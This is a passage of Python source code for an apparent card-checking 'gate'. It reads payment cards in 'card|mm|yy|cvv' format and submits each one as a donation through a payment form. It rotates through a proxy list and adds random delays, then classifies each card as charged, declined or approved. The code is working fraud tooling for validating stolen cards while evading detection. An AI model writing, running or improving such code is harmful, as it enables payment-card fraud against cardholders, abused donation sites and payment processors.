        if not payment_method_id:
            raise Exception(f"Payment method creation failed: {error}")

        await asyncio.sleep(random.uniform(0.5, 1.0))


        result = await make_donation(session, payment_method_id, form_hash, proxy=proxy)

        return result

async def check_gate(card_string: str) -> dict:
    """
    Async entry point.
    Input: card|mm|yy|cvv
    Returns: dict with status, decline_code, response
    """
    parts = [p.strip() for p in card_string.split('|')]
    if len(parts) < 4:
        return {"status": "error", "decline_code": None, "response": "Invalid card format"}

    card_number = parts[0]
    exp_month = parts[1].zfill(2)
    exp_year = parts[2]
    cvv = parts[3]


    if len(exp_year) == 4:
        exp_year = exp_year[2:]


    for proxy_str in PROXIES_LIST:
        proxy = parse_proxy(proxy_str)
        try:
            result = await _do_check_async(card_number, exp_month, exp_year, cvv, proxy=proxy)

            if result.get('status') in ['charged', 'declined', 'approved']:
                return result
        except (aiohttp.ClientProxyConnectionError, aiohttp.ClientHttpProxyError, asyncio.TimeoutError):
            continue
        except Exception:
            continue


    try:
        return await _do_check_async(card_number, exp_month, exp_year, cvv, proxy=None)
    except asyncio.TimeoutError:
        return {"status": "error", "decline_code": None, "response": "Timeout"}
    except Exception as e:
        return {"status": "error", "decline_code": None, "response": str(e)[:100]}